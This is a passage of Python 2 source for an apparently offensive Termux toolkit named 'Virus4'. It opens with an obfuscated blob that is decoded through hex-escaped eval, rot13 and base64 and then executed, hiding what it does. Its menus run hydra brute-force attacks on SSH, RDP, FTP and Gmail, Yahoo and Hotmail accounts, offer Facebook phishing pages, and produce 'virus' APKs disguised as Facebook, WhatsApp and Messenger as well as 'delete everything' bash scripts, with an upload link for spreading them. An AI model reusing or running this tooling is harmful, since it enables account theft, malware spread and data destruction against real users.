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'
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 backtomenu_account()
def facebook():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Guess facebook '
 time.sleep(0.05)
 print cyan +'        [02]Available facebook'
 time.sleep(0.05)
 print cyan +'        [03]A fake page for Facebook'
 time.sleep(0.05)
 print cyan +'        [04]get data account facebook'
 time.sleep(0.05)
 print cyan +'        [05]Shield protection facebook'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "account/account_facebook"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      facebook_password()
 elif nember == '2' or nember == '02' :
      facebook_motah()
 elif nember == '3' or nember == '03' :
      facebook_weeman()
 elif nember == '4' or nember == '04' :
      facebook_osif()
 elif nember == '5' or nember == '05' :
      facebook_guardn()
 elif nember == '0' or nember == '00' :
      account()
 else :
      error()
      facebook()
def mail():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan+"  [01] Cisco Brute Force         "
 time.sleep(0.05)
 print cyan+"  [02] VNC Brute Force           "
 time.sleep(0.05)
 print cyan+"  [03] FTP Brute Force           "
 time.sleep(0.05)
 print cyan+"  [04] Gmail Brute Force         "
 time.sleep(0.05)
 print cyan+"  [05] SSH Brute Force           "
 time.sleep(0.05)
 print cyan+"  [06] TeamSpeak Brute Force     "
 time.sleep(0.05)
 print cyan+"  [07] Telnet Brute Force        "
 time.sleep(0.05)
 print cyan+"  [08] Yahoo Mail Brute Force    "
 time.sleep(0.05)
 print cyan+"  [09] Hotmail Brute Force       "
 time.sleep(0.05)
 print cyan+"  [10] Router Speedy Brute Force "
 time.sleep(0.05)
 print cyan+"  [11] RDP Brute Force           "
 time.sleep(0.05)
 print cyan+"  [12] MySQL Brute Force         "
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "account/account_mail"+ cyan + ") > ")

 if nember == '01' or nember == '1':
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print cyan+"          +---------------------------+"
  time.sleep(0.05)
  print cyan+"          |     Cisco Brute Force     |"
  time.sleep(0.05)
  print cyan+"          +---------------------------+"
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print
  time.sleep(0.05)
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -P %s %s cisco" % (word, iphost))

  
 elif nember == '02' or nember == '2':
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print cyan+"          +---------------------------+"
  time.sleep(0.05)
  print cyan+"          |      VNC Brute Force      |"
  time.sleep(0.05)
  print cyan+"          +---------------------------+"
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print
  time.sleep(0.05)
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  
 elif nember == '03' or nember == '3':
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print cyan+"          +------------------------------+"
  time.sleep(0.05)
  print cyan+"          |        FTP Brute Force       |"
  time.sleep(0.05)
  print cyan+"          +------------------------------+"
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print
  time.sleep(0.05)
  user = raw_input("[*] User : ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  
  
 elif nember == '04' or nember == '4':
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print cyan+"          +------------------------------+"
  time.sleep(0.05)
  print cyan+"          |       Gmail Brute Force      |"
  time.sleep(0.05)
  print cyan+"          +------------------------------+"
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print
  time.sleep(0.05)
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  
  
 elif nember == '05' or nember == '5':
   time.sleep(0.05)
   print
   time.sleep(0.05)
   print cyan+"         +--------------------------------+"
   time.sleep(0.05)
   print cyan+"         |        SSH Brute Force         |"
   time.sleep(0.05)
   print cyan+"         +--------------------------------+"
   time.sleep(0.05)
   print
   time.sleep(0.05)
   print
   time.sleep(0.05)
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   
   
 elif nember == '06' or nember == '6':
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print cyan+"        +-------------------------+"
	time.sleep(0.05)
	print cyan+"        |  TeamSpeak Brute Force  |"
	time.sleep(0.05)
	print cyan+"        +-------------------------+"
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print
	time.sleep(0.05)
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
	

 elif nember == '07' or nember == '7':
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print cyan+"        +-------------------------+"
	time.sleep(0.05)
	print cyan+"        |   Telnet Brute Force    |"
	time.sleep(0.05)
	print cyan+"        +-------------------------+"
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print
	time.sleep(0.05)
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
	
	
 elif nember == '08' or nember == '8':
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print cyan+"          +---------------------------+"
  time.sleep(0.05)
  print cyan+"          |     Yahoo Brute Force     |"
  time.sleep(0.05)
  print cyan+"          +---------------------------+"
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print
  time.sleep(0.05)
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
  
  
 elif nember == '09' or nember == '9':
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print cyan+"          +----------------------------+"
  time.sleep(0.05)
  print cyan+"          |    Hotmail Brute Force     |"
  time.sleep(0.05)
  print cyan+"          +----------------------------+"
  time.sleep(0.05)
  print
  time.sleep(0.05)
  print
  time.sleep(0.05)
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  
  
 elif nember == '10':
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print cyan+"        +-----------------------------+"
	time.sleep(0.05)
	print cyan+"        |  Router Speedy Brute Force  |"
	time.sleep(0.05)
	print cyan+"        +-----------------------------+"
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print
	time.sleep(0.05)
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
	
 elif nember == '11':
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print cyan+"        +----------------------------+"
	time.sleep(0.05)
	print cyan+"        |      RDP Brute Force       |"
	time.sleep(0.05)
	print cyan+"        +----------------------------+"
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print
	time.sleep(0.05)
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
	
	
 elif nember == '12':
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print cyan+"        +-----------------------------+"
	time.sleep(0.05)
	print cyan+"        |       MySQL Brute Force     |"
	time.sleep(0.05)
	print cyan+"        +-----------------------------+"
	time.sleep(0.05)
	print
	time.sleep(0.05)
	print
	time.sleep(0.05)
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
	
 elif nember == '00' or nember == '0':
  account()
 else:
	error()
	mail()
 backtomenu_account()
def instagram():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan+ '     Oops on next version'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "account/account_instagram"+ cyan + ") > ")
 if nember == '0' or nember == '00' :
      account()
 else :
      error()
      instagram()
 backtomenu_account()
def goodlist():
 
 print ''
 time.sleep(0.05)
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 aaa = raw_input(cyan +'Entre name The LisT : ')
 print ''
 time.sleep(0.05)
 print red +"                                          exit"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 file = open(aaa, 'w')
 aa = set([])
 oio = set([])
 kk = 1
 while True:
    b = raw_input(cyan+'PASS{} : '.format(kk))
    if b == 'exit':
        print '\x1b[3;36m'
        file.close()
        qq = open(aaa, 'r')
        ll = len(qq.readlines())
        print cyan+'------------------------------------------------------------'
        print '>> {} Passwords in $HOME ---> {} '.format(ll, aaa)
        print '------------------------------------------------------------'
        break
    aa.add(b)
    for i in aa:
        if len(i) >= 3:
            if i not in oio:
                oio.add(i)
                file.write(i)
                file.write('\n')
            c = b + i
            d = i + b
            if len(c) >= 3:
                file.write(c)
                file.write('\n')
            if c != d:
                if len(d) >= 3:
                    file.write(d)
                    file.write('\n')

    kk = int(kk) + 1
    print green +'----------------------------------------'
 os.system('mv -v '+aaa+' ~')
 backtomenu_account()
def account():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Account facebook '
 time.sleep(0.05)
 print cyan +'        [02]Account instagram'
 time.sleep(0.05)
 print cyan +'        [03]Account mail'
 time.sleep(0.05)
 print cyan +'        [04]Create list password '
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "account"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      facebook()
 elif nember == '2' or nember == '02' :
      instagram()
 elif nember == '3' or nember == '03' :
      mail()
 elif nember == '4' or nember == '04' :
      goodlist()
 elif nember == '0' or nember == '00' :
      Virus4()
 else :
      error()
      account()
def virus_android_normal():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/android/virs.apk $HOME/'+name+'.apk')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.apk'
 backtomenu_virus()
def virus_android_facebook():
 creat_virus()
 os.system('cp -r tools/virus/android/Facebook.apk $HOME/facebook.apk')
 print blue +'  Path of the Virus----->  $HOME/facebook.apk'
 backtomenu_virus()
 
def virus_android_instagram():
 creat_virus()
 os.system('cp -r tools/virus/android/Instagram.apk $HOME/instagram.apk')
 print blue +'  Path of the Virus----->  $HOME/instagram.apk'
 backtomenu_virus()
 
def virus_android_messenger():
 creat_virus()
 os.system('cp -r tools/virus/android/Messenger.apk $HOME/messenger.apk')
 print blue +'  Path of the Virus----->  $HOME/messenger.apk'
 backtomenu_virus()
 
def virus_android_whatsapp():
 creat_virus()
 os.system('cp -r tools/virus/android/WhatsApp.apk $HOME/whatsapp.apk')
 print blue +'  Path of the Virus----->  $HOME/whatsapp.apk'
 backtomenu_virus()
 
def virus_android():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Create a normal {virus} '
 time.sleep(0.05)
 print cyan +'        [02]Create a semi-facebook  {virus}'
 time.sleep(0.05)
 print cyan +'        [03]Create a semi-instagram {virus}'
 time.sleep(0.05)
 print cyan +'        [04]Create a semi-messenger {virus}'
 time.sleep(0.05)
 print cyan +'        [05]Create a semi-whatsapp  {virus}'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "virus/virus_android"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      virus_android_normal()
 elif nember == '2' or nember == '02' :
      virus_android_facebook()
 elif nember == '3' or nember == '03' :
      virus_android_instagram()
 elif nember == '4' or nember == '04' :
      virus_android_messenger()
 elif nember == '5' or nember == '05' :
      virus_android_whatsapp()
 elif nember == '0' or nember == '00' :
      virus()
 else :
      error()
      virus_android()
def virus_windows():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan+ '     Oops on next version'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "virus/virus_windows"+ cyan + ") > ")
 if nember == '0' or nember == '00' :
      virus()
 else :
      error()
      virus_windows()

def virus_mac():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan+ '     Oops on next version'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "virus/virus_mac"+ cyan + ") > ")
 if nember == '0' or nember == '00' :
      virus()
 else :
      error()
      virus_mac()
def virus_linux_bash1():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/linux/vir.sh $HOME/'+name+'.sh')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.sh'
 backtomenu_virus()
def virus_linux_bash2():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/linux/vi.sh $HOME/'+name+'.sh')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.sh'
 backtomenu_virus()
def virus_linux():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Create a virus delete everything {bash}'
 time.sleep(0.05)
 print cyan +'        [02]Create a virus exploding area {bash}'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "virus/virus_linux"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      virus_linux_bash1()
 elif nember == '2' or nember == '02' :
      virus_linux_bash2()
 elif nember == '0' or nember == '00' :
      virus()
 else :
      error()
      virus_linux()


def virus_whatsapp_1():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/1.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_2():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/2.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_3():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/3.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_4():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/4.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_5():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/5.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_6():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/6.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_7():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/7.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_8():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/8.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_9():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/9.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_10():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/10.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_11():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/11.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()
 
def virus_whatsapp_12():
 name = raw_input('name -----> ')
 creat_virus()
 os.system('cp -r tools/virus/whatsapp/12.txt $HOME/'+name+'.txt')
 print blue +'  Path of the Virus----->  $HOME/'+name+'.txt'
 backtomenu_virus()

def virus_whatsapp():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Virus1 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'        [02]Virus2 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'        [03]Virus3 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'        [04]Virus4 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'        [05]Virus5 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'        [06]Virus6 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'        [07]Virus7 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'        [08]Virus8 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'        [09]Virus9 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'        [10]Anti-Virus1 { .txt }'
 time.sleep(0.05)
 print cyan +'        [11Anti-Virus2 { .txt }'
 time.sleep(0.05)
 print cyan +'        [12]send virus chat Whatsapp { .txt }'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "virus/virus_whatsapp"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      virus_whatsapp_1()
 elif nember == '2' or nember == '02' :
      virus_whatsapp_2()
 elif nember == '3' or nember == '03' :
      virus_whatsapp_3()
 elif nember == '4' or nember == '04' :
      virus_whatsapp_4()
 elif nember == '5' or nember == '05' :
      virus_whatsapp_5()
 elif nember == '6' or nember == '06' :
      virus_whatsapp_6()
 elif nember == '7' or nember == '07' :
      virus_whatsapp_7()
 elif nember == '8' or nember == '08' :
      virus_whatsapp_8()
 elif nember == '9' or nember == '09' :
      virus_whatsapp_9()
 elif nember == '10' :
      virus_whatsapp_10()
 elif nember == '11' :
      virus_whatsapp_11()
 elif nember == '12' :
      virus_whatsapp_12()
 elif nember == '0' or nember == '00' :
      virus()
 else :
      error()
      virus_whatsapp()

def upload_vp():
 print ""
 time.sleep(2)
 print cyan+'  {'+red+'upload'+cyan+'}--------{'+red+'https://www.up-4.net/?op=upload'+cyan+'}'
 time.sleep(6)
 webbrowser.open_new('https://www.up-4.net/?op=upload')
 os.system("termux-open https://www.up-4.net/?op=upload ")
 Virus4()
def virus():
 print ''
 time.sleep(0.05)
 print red +"                                          [0]back"
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print cyan +'        [01]Virus android '
 time.sleep(0.05)
 print cyan +'        [02]Virus windows'
 time.sleep(0.05)
 print cyan +'        [03]Virus mac'
 time.sleep(0.05)
 print cyan +'        [04]Virus linux'
 time.sleep(0.05)
 print cyan +'        [05]Virus whatsapp'
 time.sleep(0.05)
 print cyan +'        [06]Upload {Virus} and {payload}'
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 print ''
 time.sleep(0.05)
 nember =raw_input("Virus4(" + red + "virus"+ cyan + ") > ")
 if nember == '1' or nember == '01' :
      virus_android()
 elif nember == '2' or nember == '02' :
      virus_windows()
 elif nember == '3' or nember == '03' :
      virus_mac()
 elif nember == '4' or nember == '04' :
